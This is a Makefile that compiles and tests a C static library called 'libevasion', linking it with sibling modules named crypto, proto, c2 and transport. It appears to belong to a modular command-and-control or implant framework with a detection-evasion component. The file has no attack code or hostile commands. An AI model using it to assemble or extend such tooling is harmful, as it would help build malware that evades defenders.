MAKEFLAGS += -r
CC      ?= cc
CFLAGS  ?= -O2 -Wall -Wextra -Wpedantic -std=c11 -fvisibility=hidden \
           -Iinclude \
           -I../00_crypto/include \
           -I../01_proto/include \
           -I../02_c2/include \
           -I../03_transport/include
LDFLAGS ?= -Lbuild \
           -L../00_crypto/build \
           -L../01_proto/build \
           -L../02_c2/build \
           -L../03_transport/build
LDLIBS  ?= -levasion -lcrypto -lproto -lc2 -ltransport -lpthread

BUILD_DIR := build
SOURCES := $(wildcard src/*.c)
OBJECTS := $(SOURCES:src/%.c=build/%.o)
TESTS   := $(wildcard tests/test_*.c)
# 测试目标加 t_ 前缀, 避免与 build/%.o 模式冲突
TEST_BINS := $(TESTS:tests/test_%.c=build/t_%)

all: build/libevasion.a

build/libevasion.a: $(OBJECTS) | build
	$(AR) rcs $@ $^

build/%.o: src/%.c | build
	$(CC) $(CFLAGS) -c $< -o $@

build/t_%: tests/test_%.c build/libevasion.a | build
	$(CC) $(CFLAGS) $< -o $@ $(LDFLAGS) -lcrypto -lproto -lc2 -ltransport -lpthread -levasion

test: $(TEST_BINS)
	@for t in $(TEST_BINS); do \
		echo "=== $$(basename $$t) ==="; \
		./$$t || exit 1; \
	done

build:
	mkdir -p build

clean:
	rm -rf build

.PHONY: all test clean
